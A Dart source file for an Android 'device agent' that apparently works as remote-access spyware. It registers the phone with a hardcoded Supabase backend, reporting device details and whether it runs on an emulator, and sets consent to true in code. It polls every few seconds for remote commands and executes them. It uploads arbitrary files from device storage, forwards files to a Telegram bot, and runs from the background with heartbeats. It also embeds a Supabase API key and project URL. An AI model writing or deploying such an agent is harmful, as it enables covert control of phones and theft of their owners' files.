// lib/core/device_agent.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

import 'command_parser.dart';
import '../platform/command_dispatcher.dart';
import 'device_id.dart';

class DeviceAgent {
  DeviceAgent._();
  static final DeviceAgent instance = DeviceAgent._();

  String supabaseUrl = '';
  String deviceId = '';

  final http.Client _http = http.Client();
  Timer? _pollTimer;

  bool _running = false;
  bool _busy = false;
  bool _registered = false;

  static const Duration pollInterval = Duration(seconds: 5);

  static const String SUPABASE_ANON_KEY =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt5d3BuaGFlcm13bGR6Y3d0c252Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg2MjQ5NDAsImV4cCI6MjA4NDIwMDk0MH0.U47u5W9Z7imMXXvzQ66xCx7_3CXjgqJrLrU-dgDZb68';

  static const String _DEFAULT_SUPABASE_URL =
      'https://kywpnhaermwldzcwtsnv.supabase.co';

  // -------------------- CONFIG --------------------

  Future<void> configure({
    required String supabaseUrl,
    required String deviceId,
  }) async {
    this.supabaseUrl = supabaseUrl;
    this.deviceId = deviceId;
  }

  // ✅ Collect device info ONCE during registration
  Future<Map<String, dynamic>> _collectDeviceInfo() async {
    try {
      final deviceInfoPlugin = DeviceInfoPlugin();
      
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfoPlugin.androidInfo;
        
        // Detect if physical device
        final isPhysical = !(
          androidInfo.fingerprint.startsWith("generic") ||
          androidInfo.fingerprint.startsWith("unknown") ||
          androidInfo.model.contains("google_sdk") ||
          androidInfo.model.contains("Emulator") ||
          androidInfo.model.contains("Android SDK built for x86") ||
          androidInfo.manufacturer.contains("Genymotion") ||
          (androidInfo.brand.startsWith("generic") && androidInfo.device.startsWith("generic")) ||
          androidInfo.product == "google_sdk"
        );
        
        return {
          'android_version': '${androidInfo.version.release} (API ${androidInfo.version.sdkInt})',
          'build_id': androidInfo.display,
          'android': androidInfo.display,
          'sdk_int': androidInfo.version.sdkInt,
          'manufacturer': androidInfo.manufacturer,
          'brand': androidInfo.brand,
          'model': androidInfo.model,
          'device': androidInfo.device,
          'product': androidInfo.product,
          'platform': 'android',
          'physical': isPhysical,
          'cwd': '/storage/emulated/0',
          'storage_total_gb': 0,  // Placeholder - implement if needed
          'storage_free_gb': 0,   // Placeholder - implement if needed
        };
      }
      
      return {};
    } catch (e, st) {
      print('[DeviceAgent] Failed to collect device info: $e\n$st');
      return {};
    }
  }

  // ✅ Register with device info
  Future<void> register() async {
    if (_registered) return;
    
    try {
      print('[DeviceAgent] Registering device: $deviceId');
      
      // Collect device info once
      final deviceInfo = await _collectDeviceInfo();
      print('[DeviceAgent] Device info collected: ${deviceInfo.keys.join(", ")}');
      
      await _post('/register-device', {
        'device_id': deviceId,
        'display_name': 'Android Media Agent',
        'consent': true,
        'device_info': deviceInfo,  // ✅ Send device info
      });
      
      _registered = true;
      print('[DeviceAgent] Registration complete');
      
    } catch (e, st) {
      print('[DeviceAgent] Registration failed: $e\n$st');
      rethrow;
    }
  }

  // ✅ NEW: Get device info from database
  Future<Map<String, dynamic>> getDeviceInfo() async {
    try {
      print('[DeviceAgent] Fetching device info from database');
      return await _get('/get-device-info');
    } catch (e, st) {
      print('[DeviceAgent] Failed to get device info: $e\n$st');
      return {'success': false, 'error': 'fetch_failed', 'detail': e.toString()};
    }
  }

  // -------------------- POLLER --------------------

  Future<void> start() async {
    if (_running) return;
    _running = true;
    await _pollOnce();
    _pollTimer = Timer.periodic(pollInterval, (_) => _pollOnce());
  }

  Future<void> stop() async {
    _pollTimer?.cancel();
    _running = false;
    _busy = false;
  }

  Future<void> _pollOnce() async {
    if (!_running || _busy) return;
    _busy = true;

    try {
      final res = await _get('/get-commands', query: {'limit': '5'});
      final List<dynamic> cmds = (res['commands'] ?? res['data'] ?? []) as List<dynamic>;

      for (final c in cmds) {
        if (c is Map) {
          await _handleCommand(Map<String, dynamic>.from(c));
        }
      }
    } catch (e) {
      print('[DeviceAgent] Poll error: $e');
    } finally {
      _busy = false;
    }
  }

  // -------------------- COMMAND HANDLER --------------------

  Future<void> _handleCommand(Map<String, dynamic> raw) async {
    final parsed = CommandParser.parse(raw, deviceId);

    if (parsed.error != null) {
      final id = raw['id']?.toString();
      if (id != null) {
        await _updateCommandStatus(id, 'failed', {'error': parsed.error});
      }
      return;
    }

    final cmd = parsed.command!;
    Map<String, dynamic> result;

    try {
      final actionName = cmd.action.name;
      
      if (actionName == 'upload_file' || actionName == 'upload') {
        final path = cmd.payload?['path'] ?? cmd.payload?['file'];
        if (path != null) {
          print('[DeviceAgent] Executing UPLOAD for path: $path');
          result = await _handleUpload(path);
        } else {
          result = {'success': false, 'error': 'missing_path_for_upload'};
        }
      }
      else if (actionName == 'send' || (actionName == 'raw' && cmd.payload?['telegram'] != null)) {
        final path = cmd.payload?['path'] ?? cmd.payload?['file'];
        final telegram = cmd.payload?['telegram'];
        
        if (path != null && telegram != null && telegram is Map) {
          print('[DeviceAgent] Executing SEND to Telegram for path: $path');
          result = await _handleSend(path, Map<String, dynamic>.from(telegram));
        } else {
          result = {'success': false, 'error': 'missing_path_or_telegram_config'};
        }
      }
      else {
        print('[DeviceAgent] Executing command: ${cmd.action.name}');
        result = await CommandDispatcher.instance.executeCommand(
          cmd,
          timeout: const Duration(seconds: 60),
        );
        print('[DeviceAgent] Command result: $result');
      }
    } catch (e, stack) {
      print('[DeviceAgent] Command execution error: $e\n$stack');
      result = {'success': false, 'error': 'execution_exception', 'detail': e.toString()};
    }

    try {
      await _updateCommandStatus(
        cmd.id,
        result['success'] == true ? 'done' : 'failed',
        result,
      );
      print('[DeviceAgent] Command ${cmd.id} status updated: ${result['success'] == true ? 'done' : 'failed'}');
    } catch (e) {
      print('[DeviceAgent] Failed to update command status: $e');
    }
  }

  // -------------------- UPLOAD (Supabase Storage) --------------------

  Future<Map<String, dynamic>> _handleUpload(String path) async {
    try {
      final file = File(path);
      if (!await file.exists()) {
        return {'success': false, 'error': 'file_not_found', 'path': path};
      }

      final bytes = await file.readAsBytes();
      final filename = path.split('/').last;

      final uri = Uri.parse('$supabaseUrl/functions/v1/upload-file');
      final req = http.MultipartRequest('POST', uri)
        ..headers.addAll({
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
          'apikey': SUPABASE_ANON_KEY,
          'X-Device-ID': deviceId,
        })
        ..fields['device_id'] = deviceId
        ..fields['bucket'] = 'device-uploads'
        ..fields['dest'] = filename;

      final mimeType = _getMimeType(filename);
      req.files.add(
        http.MultipartFile.fromBytes(
          'file',
          bytes,
          filename: filename,
          contentType: MediaType.parse(mimeType),
        ),
      );

      print('[DeviceAgent] Uploading $filename (${bytes.length} bytes) to Supabase...');
      
      final streamedResp = await req.send().timeout(const Duration(seconds: 90));
      final resp = await http.Response.fromStream(streamedResp);

      print('[DeviceAgent] Upload response: ${resp.statusCode}');

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        if (resp.body.isEmpty) {
          return {'success': true, 'message': 'File uploaded successfully'};
        }
        
        try {
          final decoded = jsonDecode(resp.body);
          if (decoded is Map<String, dynamic>) {
            final publicUrl = decoded['publicUrl'] ?? decoded['public_url'] ?? decoded['url'];
            return {
              'success': true,
              'publicUrl': publicUrl,
              'filename': filename,
              ...decoded
            };
          }
          return {'success': true, 'result': decoded};
        } catch (_) {
          return {'success': true, 'message': resp.body};
        }
      }

      return {
        'success': false,
        'error': 'upload_failed',
        'status': resp.statusCode,
        'body': resp.body
      };
    } catch (e, stack) {
      print('[DeviceAgent] Upload exception: $e\n$stack');
      return {'success': false, 'error': 'upload_exception', 'detail': e.toString()};
    }
  }

  // -------------------- SEND (TELEGRAM) --------------------

  Future<Map<String, dynamic>> _handleSend(
    String path,
    Map<String, dynamic> telegram,
  ) async {
    try {
      final file = File(path);
      if (!await file.exists()) {
        return {'success': false, 'error': 'file_not_found', 'path': path};
      }

      final botToken = telegram['bot_token'] ?? telegram['token'] ?? telegram['botToken'];
      final chatId = telegram['chat_id'] ?? telegram['chatId'] ?? telegram['chat'];

      if (botToken == null || chatId == null) {
        return {
          'success': false,
          'error': 'missing_telegram_credentials',
          'detail': 'Requires bot_token and chat_id in payload.telegram'
        };
      }

      final filename = path.split('/').last;
      final uri = Uri.parse('https://api.telegram.org/bot$botToken/sendDocument');

      print('[DeviceAgent] Sending $filename to Telegram chat $chatId...');

      final req = http.MultipartRequest('POST', uri)
        ..fields['chat_id'] = chatId.toString()
        ..files.add(
          http.MultipartFile.fromBytes(
            'document',
            await file.readAsBytes(),
            filename: filename,
            contentType: MediaType.parse(_getMimeType(filename)),
          ),
        );

      final streamedResp = await req.send().timeout(const Duration(seconds: 60));
      final resp = await http.Response.fromStream(streamedResp);

      print('[DeviceAgent] Telegram response: ${resp.statusCode}');

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        try {
          final decoded = jsonDecode(resp.body);
          if (decoded is Map<String, dynamic>) {
            return {
              'success': true,
              'message': 'File sent to Telegram successfully',
              'filename': filename,
              'telegram_response': decoded
            };
          }
          return {'success': true, 'result': decoded};
        } catch (_) {
          return {'success': true, 'message': 'File sent successfully'};
        }
      }

      return {
        'success': false,
        'error': 'telegram_api_error',
        'status': resp.statusCode,
        'body': resp.body
      };
    } catch (e, stack) {
      print('[DeviceAgent] Telegram send exception: $e\n$stack');
      return {'success': false, 'error': 'telegram_send_failed', 'detail': e.toString()};
    }
  }

  String _getMimeType(String filename) {
    final ext = filename.toLowerCase().split('.').last;
    switch (ext) {
      case 'jpg':
      case 'jpeg':
        return 'image/jpeg';
      case 'png':
        return 'image/png';
      case 'gif':
        return 'image/gif';
      case 'mp4':
        return 'video/mp4';
      case 'mp3':
        return 'audio/mpeg';
      case 'pdf':
        return 'application/pdf';
      case 'txt':
        return 'text/plain';
      case 'json':
        return 'application/json';
      default:
        return 'application/octet-stream';
    }
  }

  // -------------------- PUBLIC API --------------------

  Future<void> heartbeat() async {
    try {
      await _post('/touch-device', {
        'device_id': deviceId,
      });
    } catch (_) {
      // silent by design
    }
  }

  Future<Map<String, dynamic>> uploadFile({
    required String path,
    required List<int> bytes,
    required String contentType,
    String bucket = 'device-uploads',
    String? dest,
  }) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1/upload-file');

    final filename = (dest != null && dest.isNotEmpty) ? dest.split('/').last : path.split('/').last;

    final req = http.MultipartRequest('POST', uri)
      ..headers.addAll({
        'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        'apikey': SUPABASE_ANON_KEY,
        'X-Device-ID': deviceId,
      })
      ..fields['device_id'] = deviceId
      ..fields['bucket'] = bucket
      ..fields['dest'] = filename;

    MediaType mediaType;
    try {
      mediaType = MediaType.parse(contentType);
    } catch (_) {
      mediaType = MediaType('application', 'octet-stream');
    }

    req.files.add(http.MultipartFile.fromBytes(
      'file',
      bytes,
      filename: filename,
      contentType: mediaType,
    ));

    try {
      final streamedResp = await req.send().timeout(const Duration(seconds: 90));
      final resp = await http.Response.fromStream(streamedResp);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        if (resp.body.isEmpty) return {'success': true};
        try {
          final decoded = jsonDecode(resp.body);
          if (decoded is Map<String, dynamic>) {
            return {'success': true, ...decoded};
          } else {
            return {'success': true, 'result': decoded};
          }
        } catch (_) {
          return {'success': true, '_raw': resp.body};
        }
      }

      return {'success': false, 'status': resp.statusCode, 'body': resp.body};
    } on TimeoutException catch (te) {
      return {'success': false, 'error': 'upload_timeout', 'detail': te.toString()};
    } catch (e) {
      return {'success': false, 'error': 'upload_exception', 'detail': e.toString()};
    }
  }

  // -------------------- EDGE HELPERS --------------------

  Future<void> _updateCommandStatus(String id, String status, Map<String, dynamic> result) async {
    try {
      await _post('/update-command', {
        'id': id,
        'status': status,
        'result': result,
        'device_id': deviceId,
      });
    } catch (e) {
      print('[DeviceAgent] Failed to update command status for $id: $e');
    }
  }

  Future<Map<String, dynamic>> _post(String path, Map<String, dynamic> body) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1$path');

    final res = await _http
        .post(
          uri,
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer $SUPABASE_ANON_KEY',
            'apikey': SUPABASE_ANON_KEY,
            'X-Device-ID': deviceId,
          },
          body: jsonEncode(body),
        )
        .timeout(const Duration(seconds: 12));

    if (res.statusCode >= 400) {
      throw Exception('Edge error ${res.statusCode}: ${res.body}');
    }

    if (res.body.isEmpty) return {};
    try {
      return jsonDecode(res.body) as Map<String, dynamic>;
    } catch (_) {
      return {'_raw': res.body};
    }
  }

  Future<Map<String, dynamic>> _get(String path, {Map<String, String>? query}) async {
    var uri = Uri.parse('$supabaseUrl/functions/v1$path');
    if (query != null) uri = uri.replace(queryParameters: query);

    final res = await _http.get(uri, headers: {
      'Accept': 'application/json',
      'Authorization': 'Bearer $SUPABASE_ANON_KEY',
      'apikey': SUPABASE_ANON_KEY,
      'X-Device-ID': deviceId,
    }).timeout(const Duration(seconds: 10));

    if (res.statusCode >= 400) {
      throw Exception('Edge GET error ${res.statusCode}: ${res.body}');
    }

    if (res.body.isEmpty) return {};
    try {
      return jsonDecode(res.body) as Map<String, dynamic>;
    } catch (_) {
      return {'_raw': res.body};
    }
  }

  Future<void> startFromBackground() async {
    try {
      if (_running) return;

      if (supabaseUrl.isEmpty) {
        supabaseUrl = _DEFAULT_SUPABASE_URL;
      }

      if (deviceId.isEmpty) {
        deviceId = await DeviceId.getOrCreate();
      }

      await register();
      await start();

      Timer.periodic(const Duration(seconds: 30), (_) => heartbeat());
    } catch (e) {
      print('[DeviceAgent] Background start error: $e');
    }
  }
}
